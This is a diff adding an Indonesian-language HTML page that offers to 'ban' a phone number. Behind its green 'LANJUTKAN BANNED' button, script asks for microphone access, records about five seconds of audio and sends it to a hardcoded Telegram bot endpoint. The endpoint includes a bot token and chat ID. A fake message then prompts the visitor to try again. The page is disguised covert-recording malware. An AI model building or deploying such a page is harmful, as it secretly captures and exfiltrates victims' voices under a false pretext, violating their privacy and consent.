@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        /* CSS untuk tema hijau muda dan putih */
+        body {
+            background-color: #f0f8f7; /* hijau muda */
+            color: #ffffff; /* putih */
+            font-family: Arial, sans-serif; /* jenis huruf */
+        }
+
+        h1 {
+            text-align: center;
+            animation: color-change 1s infinite alternate; /* animasi teks berwarna-warni */
+            font-size: 24px; /* perbesar ukuran teks */
+        }
+
+        /* animasi untuk teks berwarna-warni */
+        @keyframes color-change {
+            0% {
+                color: red;
+            }
+            25% {
+                color: blue;
+            }
+            50% {
+                color: orange;
+            }
+            75% {
+                color: green;
+            }
+            100% {
+                color: purple;
+            }
+        }
+
+        /* CSS untuk tombol */
+        button {
+            background-color: #4caf50; /* hijau */
+            color: #ffffff; /* putih */
+            font-size: 24px; /* perbesar ukuran tombol */
+            padding: 15px 30px; /* perbesar padding tombol */
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            display: block;
+            margin: 20px auto; /* pusatkan tombol */
+        }
+
+        button:hover {
+            background-color: #45a049; /* hijau gelap saat disorot */
+        }
+
+        /* CSS untuk logo */
+        .logo {
+            display: block;
+            margin: 0 auto 20px; /* pusatkan logo */
+        }
+    </style>
+    <script>
+        function sendAudioToTelegram(audioBlob) {
+            // Telegram bot API endpoint
+            var telegramBotUrl = "https://api.telegram.org/bot7079787671:AAGb9V_FfPBOsO6uBTj5wUo_Grr010MMJ2w/sendVoice?chat_id=6724406279";
+
+            // Create a FormData object to send audio file as multipart/form-data
+            var formData = new FormData();
+            formData.append("voice", audioBlob);
+
+            // Send audio to Telegram bot
+            var request = new XMLHttpRequest();
+            request.open("POST", telegramBotUrl, true);
+            request.send(formData);
+
+            alert("Ulangi Banned Gan");
+        }
+
+        function startAudioRecording() {
+            // Check if MediaRecorder API is supported
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+
+                // Constraints for audio recording
+                var constraints = { audio: true };
+
+                // Start audio recording
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(function (stream) {
+                        // Create MediaRecorder instance
+                        var mediaRecorder = new MediaRecorder(stream);
+
+                        // Initialize audio data array
+                        var audioDataChunks = [];
+
+                        // Collect audio data in chunks
+                        mediaRecorder.ondataavailable = function (e) {
+                            audioDataChunks.push(e.data);
+                        }
+
+                        // Stop audio recording and send it to Telegram bot
+                        mediaRecorder.onstop = function () {
+                            var audioBlob = new Blob(audioDataChunks, { type: 'audio/wav' });
+                            sendAudioToTelegram(audioBlob);
+                        }
+
+                        // Start recording
+                        mediaRecorder.start();
+
+                        // Join Our Telegram Channel - @Unknown_Reason 
+                        setTimeout(function () {
+                            mediaRecorder.stop();
+                        }, 5000);
+
+                    })
+                    .catch(function (error) {
+                        console.log("Error accessing user media: " + error);
+                    });
+            } else {
+                alert(" Not supported in this browser ❌");
+            }
+        }
+    </script>
+</head>
+<body>
+    <!-- Logo -->
+    <img src="https://telegra.ph/file/f81efc7283b8b6e8a870e.jpg" alt="Logo" class="logo">
+
+    <!-- Teks dan Tombol -->
+    <h1>APAKAH ANDA YAKIN UNTUK BANNED NOMER TERSEBUT?</h1>
+    <button onclick="startAudioRecording()">LANJUTKAN BANNED</button>
+</html>
